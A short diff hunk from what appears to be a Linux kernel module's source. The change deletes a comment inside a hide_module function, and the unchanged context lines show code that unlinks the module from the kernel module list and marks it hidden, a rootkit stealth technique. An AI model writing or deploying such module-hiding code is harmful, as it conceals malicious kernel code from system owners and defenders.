@@ -14,7 +14,6 @@ int hide_module(void)
         return SUCCESS;
     }
 
-    /* remember where we were, then unlink */
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     module_hidden = true;
